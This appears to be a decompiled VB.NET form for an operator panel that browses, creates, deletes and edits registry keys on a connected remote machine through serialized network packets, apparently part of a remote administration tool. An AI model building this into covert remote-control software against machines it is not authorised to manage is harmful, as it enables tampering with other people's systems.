Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class RegistryManager
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub CreateNewSubKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewSubKeyToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Please enter a valid name for a new SubKey!", "New SubKey", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Me.SendPacket(New Object() {CByte(&H7D), Me.TreeView1.SelectedNode.FullPath, str})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub DeleteKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteKeyToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(&H7E), Me.TreeView1.SelectedNode.FullPath})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(&H7F), Me.Label_Information.Text, Me.ListView1.SelectedItems.Item(0).Text})
            Me.ListView1.Items.Remove(Me.ListView1.SelectedItems.Item(0))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ModifyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ModifyToolStripMenuItem.Click
        Try
            My.Forms.Modify_Registry.client = Me.client
            My.Forms.Modify_Registry.TextBox1.Text = Me.ListView1.SelectedItems.Item(0).Text
            My.Forms.Modify_Registry.RichTextBox1.Text = Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text
            My.Forms.Modify_Registry.path = Me.curnode.FullPath
            My.Forms.Modify_Registry.Show()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub NameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NameToolStripMenuItem.Click
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).Text)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub NewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewToolStripMenuItem.Click
        Try
            My.Forms.Modify_Registry.client = Me.client
            My.Forms.Modify_Registry.Text = "Create new value"
            My.Forms.Modify_Registry.editing = True
            My.Forms.Modify_Registry.path = Me.curnode.FullPath
            My.Forms.Modify_Registry.Show()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RegistryManager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.TreeView1.Nodes.Add("HKEY_CLASSES_ROOT")
        Me.TreeView1.Nodes.Add("HKEY_CURRENT_USER")
        Me.TreeView1.Nodes.Add("HKEY_LOCAL_MACHINE")
        Me.TreeView1.Nodes.Add("HKEY_USERS")
        Me.TreeView1.Nodes.Add("HKEY_CURRENT_CONFIG")
        Me.TreeView1.SelectedNode = Me.TreeView1.Nodes.Item(1)
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
        GC.Collect()
    End Sub

    Private Sub TreeView1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        Me.ListView1.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H7B), e.Node.FullPath})
        Me.curnode = e.Node
        Me.Label_Information.Text = e.Node.FullPath
    End Sub

    Private Sub ValueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ValueToolStripMenuItem.Click
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public client As ServerClient
    Public curnode As TreeNode
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        CreateNewSubKey = &H7D
        DeleteSubKey = &H7E
        DeleteValue = &H7F
        ListSubKeys = &H7B
        RegistryModify = &H80
    End Enum
End Class